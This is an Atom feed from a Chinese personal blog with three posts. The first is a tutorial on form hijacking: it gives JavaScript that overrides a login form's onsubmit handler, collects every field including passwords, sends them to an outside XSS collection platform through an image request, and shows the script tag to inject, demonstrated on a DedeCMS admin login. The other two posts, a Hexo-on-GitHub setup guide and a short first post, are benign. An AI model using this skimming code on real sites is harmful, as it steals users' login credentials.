<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[dw的博客]]></title>
  
  <link href="/atom.xml" rel="self"/>
  <link href="http://yoursite.com/"/>
  <updated>2015-04-29T03:19:46.190Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name><![CDATA[dw]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[表单劫持]]></title>
    <link href="http://yoursite.com/2015/04/29/%E8%A1%A8%E5%8D%95%E5%8A%AB%E6%8C%81/"/>
    <id>http://yoursite.com/2015/04/29/表单劫持/</id>
    <published>2015-04-29T02:22:11.000Z</published>
    <updated>2015-04-29T03:19:46.190Z</updated>
    <content type="html"><![CDATA[<pre><code>今天看到了表单劫持,于是想在XSS平台上创建一个表单劫持的项目,使用的平台是<span class="string">http:</span><span class="comment">//xss.hacktask.net/ </span>
</code></pre><blockquote>
<p>在网上找了一下表单劫持方面的资料,思路<font color="red">大多是配合xss.js公共模块,通过修改form表单里action的地址为自己的Form.php中,通过解析$_POST的内容达到劫持表单的功能.</font>有兴趣的朋友自己搜索下,这里主要介绍使用Javascript进行表单劫持,这种方法的<font color="blue">缺点会在后面给出.</font></p>
</blockquote>
<h1 id="思路">思路</h1><blockquote>
<p>大家都知道,在提交form表单时会调用onsubmit方法,既然调用了onsubmit,说明表单中该填的项肯定都已经填好了,这时,我们通过修改onsubmit方法,便可以获取表单中的信息,代码如下:</p>
</blockquote>
<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var <span class="keyword">str</span>=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span>(var i=<span class="number">0</span>;i&lt;f.elements.length;i++) <span class="comment">//逐个获取表单的名称以及值</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">str</span>+=f.elements[i].name+<span class="string">':'</span>+f.elements[i].value+<span class="string">'||'</span>; <span class="comment">//'||'为分隔符</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">str</span>=<span class="keyword">str</span>.substr(<span class="number">0</span>,<span class="keyword">str</span>.length-<span class="number">2</span>);</span><br><span class="line">var img=<span class="keyword">new</span> Image(); <span class="comment">//使用Image提交信息</span></span><br><span class="line">img.src=<span class="string">'http://xss.hacktask.net/index.php?do=api&amp;id=&#123;projectId&#125;&amp;data='</span>+escape(<span class="keyword">str</span>)+<span class="string">'&amp;url='</span>+escape(location.href); <span class="comment">//&#123;projectId&#125;为XSS平台为你分配的id</span></span><br><span class="line">func(event); <span class="comment">//func保存之前的onsubmit方法,由于这里面可能需要执行类似编码等操作,所以这里不能直接跳过</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br></pre></td></tr></table></figure>
<h1 id="模块配置">模块配置</h1><ul>
<li>首先在XSS平台中创建一个新的模块,模块名称和描述自己填吧,需要配置的是参数,配置参数,以及代码<center><br>  <img src="/img/blog_img/4月/表单劫持/1.png"><br></center>

</li>
</ul>
<blockquote>
<p>在底下的代码框写入我们的代码,就OK了</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f=<span class="built_in">document</span>.forms[<span class="string">'&#123;set.formname&#125;'</span>];</span><br><span class="line"><span class="keyword">if</span>(f==<span class="literal">undefined</span>)</span><br><span class="line">&#123;</span><br><span class="line">        f=<span class="built_in">document</span>.getElementById(<span class="string">'&#123;set.formid&#125;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> func=f.onsubmit;</span><br><span class="line">f.onsubmit=<span class="function"><span class="keyword">function</span><span class="params">(event)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> str=<span class="string">''</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;f.elements.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		str+=f.elements[i].name+<span class="string">':'</span>+f.elements[i].value+<span class="string">'||'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	str=str.substr(<span class="number">0</span>,str.length-<span class="number">2</span>);</span><br><span class="line">	<span class="keyword">var</span> img=<span class="keyword">new</span> Image();</span><br><span class="line">	img.src=<span class="string">'http://xss.hacktask.net/index.php?do=api&amp;id=&#123;projectId&#125;&amp;data='</span>+<span class="built_in">escape</span>(str)+<span class="string">'&amp;url='</span>+<span class="built_in">escape</span>(location.href);</span><br><span class="line">	func(event);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>点击配置，完成</p>
</blockquote>
<h1 id="演示">演示</h1><blockquote>
<p>这里以织梦为例,在后台那查看代码</p>
</blockquote>
<center><br>    <img src="/img/blog_img/4月/表单劫持/2.png"><br></center>

<blockquote>
<p>然后在XSS中新建一个项目,项目名称,描述,惯例随便写,选中我们自建的模块,formname写成form1,保存.<br>复制XSS代码(如果不知道怎么做的话自行百度XSS平台使用),我这里是</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">http:</span>//<span class="attribute">xss.hacktask.net</span>/<span class="attribute">9D1Q9Z</span>?<span class="attribute">1430276699</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>织梦平台上模拟XSS插入</p>
<center><br>    <img src="/img/blog_img/4月/表单劫持/3.png"><br></center>

<blockquote>
<p>这里操作就完成了,返回登录界面,随便登录一下</p>
<p>熟悉的界面</p>
</blockquote>
<center><br>    <img src="/img/blog_img/4月/表单劫持/4.png"><br></center>

<p>在XSS平台上看一下</p>
<center><br>    <img src="/img/blog_img/4月/表单劫持/5.png"><br></center>

<blockquote>
<p>截获到了吧,看下内容</p>
</blockquote>
<center><br>    <img src="/img/blog_img/4月/表单劫持/6.png"><br></center>

<h1 id="缺点">缺点</h1><blockquote>
<p>看到这里,缺点大家应该也知道了,在输入的时候不管你的用户名密码是否正确,都会上传到XSS平台,也就是说,你截获到的账号密码不一定是正确的</p>
</blockquote>
<font size="30" color="green">祝大家好运^-^</font>]]></content>
    <summary type="html">
    <![CDATA[<pre><code>今天看到了表单劫持,于是想在XSS平台上创建一个表单劫持的项目,使用的平台是<span class="string">http:</span><span class="comment">//xss.hacktask.net/ </span>
</code><]]>
    </summary>
    
      <category term="hack" scheme="http://yoursite.com/tags/hack/"/>
    
      <category term="js" scheme="http://yoursite.com/tags/js/"/>
    
      <category term="表单劫持" scheme="http://yoursite.com/tags/%E8%A1%A8%E5%8D%95%E5%8A%AB%E6%8C%81/"/>
    
      <category term="hack" scheme="http://yoursite.com/categories/hack/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[windows下hexo-github无域名安装]]></title>
    <link href="http://yoursite.com/2015/04/28/hexo-github%E6%97%A0%E5%9F%9F%E5%90%8D%E5%AE%89%E8%A3%85/"/>
    <id>http://yoursite.com/2015/04/28/hexo-github无域名安装/</id>
    <published>2015-04-28T12:06:59.000Z</published>
    <updated>2015-04-28T14:57:00.483Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>太菜了,在github上使用hexo安装安装了好久，期间各种问题不断，然后不断的上网搜索，还好最后安装成功了,就把安装过程重新记录下吧.</p>
</blockquote>
<h1 id="1-支持文件">1.支持文件</h1><blockquote>
<p>这个不用多说了,网上教程一大堆,需要:</p>
</blockquote>
<ul>
<li><a href="http://git-scm.com/download/win" target="_blank" rel="external">git bash</a></li>
<li><a href="https://nodejs.org/" target="_blank" rel="external">node.js</a></li>
</ul>
<h1 id="2-安装">2.安装</h1><blockquote>
<p>在node.js提供的命令行窗口中输入</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="operator"><span class="keyword">install</span> hexo <span class="comment">--save</span></span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>安装完成出现如下图片</p>
</blockquote>
<center><br>    <img src="/img/blog_img/4月/hexo-github无域名安装/1.png"><br></center>

<blockquote>
<p>随便建立一个博客目录,输入:</p>
</blockquote>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">hexo</span> init</span><br></pre></td></tr></table></figure>
<blockquote>
<p>出现如下：</p>
</blockquote>
<center><br>    <img src="/img/blog_img/4月/hexo-github无域名安装/2.png"><br></center>

<blockquote>
<p>然后输入:</p>
</blockquote>
<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="keyword">install</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>完成安装</p>
</blockquote>
<p><strong><font color="black">这时，本地基本上已经搭建好了,可以在<font color="red">_config.yml</font>中修改例如博客作者,标题等一系列信息;</font></strong></p>
<p>OK,我们来看看效果吧:运行下列命令:<br><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="keyword">server</span></span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>如果运行成功的话，本地端口4000会被打开,随便在哪个浏览器上输入</p>
</blockquote>
<ul>
<li><a href="http://127.0.0.1:4000" target="_blank" rel="external">http://127.0.0.1:4000</a></li>
</ul>
<center><br>    <img src="/img/blog_img/4月/hexo-github无域名安装/3.png"><br></center>

<h1 id="3-上传">3.上传</h1><blockquote>
<p>将生成的文件部署到github上,首先,你得有个github号.</p>
<p>获得github号后,在全局设置那里配置SSH公钥,具体配置过程直接使用官网的教程<a href="https://help.github.com/articles/generating-ssh-keys/" target="_blank" rel="external">https://help.github.com/articles/generating-ssh-keys/</a> 这里就不多说了,配置公钥这步主要是为了让本地主机通过github的认证，否则,部署的时候会出现无权限的错误.</p>
</blockquote>
<p>在github上新建一个工程,建好后出现如下界面</p>
<center><br>    <img src="/img/blog_img/4月/hexo-github无域名安装/4.png"><br></center>

<p>复制好后,找到<font color="red">_config.yml</font>,添加<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">type</span>: git</span><br><span class="line"><span class="attribute">repo</span>: git<span class="variable">@github</span>.<span class="attribute">com</span>:dwblog/new_blog.git</span><br></pre></td></tr></table></figure></p>
<font color="red"><strong>注意!hexo版本3.0以上的type是git,3.0以下的是github,使用hexo version查看版本,<font color="blue">如果出现ERROR Deployer not found: git,运行命令npm install hexo-deployer-git —save即可</font></strong></font>

<p>然后就可以部署了,运行<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="keyword">g</span></span><br><span class="line">hexo <span class="literal">d</span></span><br></pre></td></tr></table></figure></p>
<p>运行完毕</p>
<center><br>    <img src="/img/blog_img/4月/hexo-github无域名安装/5.png"><br></center>

<p>在github上选择刚才的项目,点setting,在下面会出现</p>
<ul>
<li>Your site is published at <a href="http://dwblog.github.io/new_blog" target="_blank" rel="external">http://dwblog.github.io/new_blog</a>.<br>说明部署成功</li>
</ul>
<h1 id="4-没有域名怎么办?">4.没有域名怎么办?</h1><blockquote>
<p>上面的步骤相信大家在网上可以搜出来很多,所以我这里主要也就是将网上的步骤归纳了一下(因为我这里按照网上的步骤一步一步走遇到了很多问题- -!).</p>
<p>接下来大家肯定迫不及待的打开自己的网页瞧一瞧,但是出问题了- -!,是不是像下图这样</p>
</blockquote>
<center><br>    <img src="/img/blog_img/4月/hexo-github无域名安装/6.png"><br></center>

<blockquote>
<p>是不是没有本地的好看,当然,你可能觉得实现了功能已经很满足了,但是,随便点一篇文章进去看看,是不是404 not found!</p>
<p>仔细看看红框中,CSS位置错了!</p>
</blockquote>
<p>在网上找了好久,发现很多教程都是让申请一个域名,然后新建一个CNAME的文件,把域名倒进去,OK.但是,<strong><font color="red">没有域名怎么办?</font></strong></p>
<p>仔细看看public中的index.html文件,发现hexo g的时候把根目录解析成了/也就是<a href="http://dwblog.github.io,不是我们的博客地址,下面介绍两种解决方法" target="_blank" rel="external">http://dwblog.github.io,不是我们的博客地址,下面介绍两种解决方法</a></p>
<h2 id="1-_修改项目名称">1. 修改项目名称</h2><p>既然他给解析成了<a href="http://dwblog.github.io" target="_blank" rel="external">http://dwblog.github.io</a> ,那我们就直接使用<a href="http://dwblog.github.io" target="_blank" rel="external">http://dwblog.github.io</a> 作为博客地址不就可以了吗？方法是创建新项目的时候使用xxx.github.io这种项目名称，然后在重复上面的操作,即可</p>
<h2 id="2-_修改根目录">2. 修改根目录</h2><p>这种思路是让他给解析成/new_blog不就可以了吗？方法很简单,在<font color="red">_config.yml</font>中找到<font color="red">root</font>项,然后把<font color="red">/</font>改成<font color="red">/new_blog</font>就可以了</p>
<p><font color="GREEN"><h1><strong>这里就不上图了- -!</strong><h1><font></font></h1></h1></font></p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>太菜了,在github上使用hexo安装安装了好久，期间各种问题不断，然后不断的上网搜索，还好最后安装成功了,就把安装过程重新记录下吧.</p>
</blockquote>
<h1 id="1-支持文件">1.支持文件</h1><blockquot]]>
    </summary>
    
      <category term="github" scheme="http://yoursite.com/tags/github/"/>
    
      <category term="hexo" scheme="http://yoursite.com/tags/hexo/"/>
    
      <category term="windows" scheme="http://yoursite.com/tags/windows/"/>
    
      <category term="无域名" scheme="http://yoursite.com/tags/%E6%97%A0%E5%9F%9F%E5%90%8D/"/>
    
      <category term="安装" scheme="http://yoursite.com/categories/%E5%AE%89%E8%A3%85/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[新的博客]]></title>
    <link href="http://yoursite.com/2015/04/28/%E6%96%B0%E7%9A%84%E5%8D%9A%E5%AE%A2/"/>
    <id>http://yoursite.com/2015/04/28/新的博客/</id>
    <published>2015-04-28T07:46:30.000Z</published>
    <updated>2015-04-28T15:00:06.394Z</updated>
    <content type="html"><![CDATA[<p>  新开的博客,折腾了半天<br>  <center><br>    <img src="/img/blog_img/4月/新的博客/14098795763615.jpg" onclick="alert('谁点谁瓜皮');return true;"><br>  </center></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>  新开的博客,折腾了半天<br>  <center><br>    <img src="/img/blog_img/4月/新的博客/14098795763615.jpg" onclick="alert('谁点谁瓜皮');return true;"><br>  </cent]]>
    </summary>
    
      <category term="blog" scheme="http://yoursite.com/tags/blog/"/>
    
      <category term="new" scheme="http://yoursite.com/tags/new/"/>
    
      <category term="日志" scheme="http://yoursite.com/categories/%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
</feed>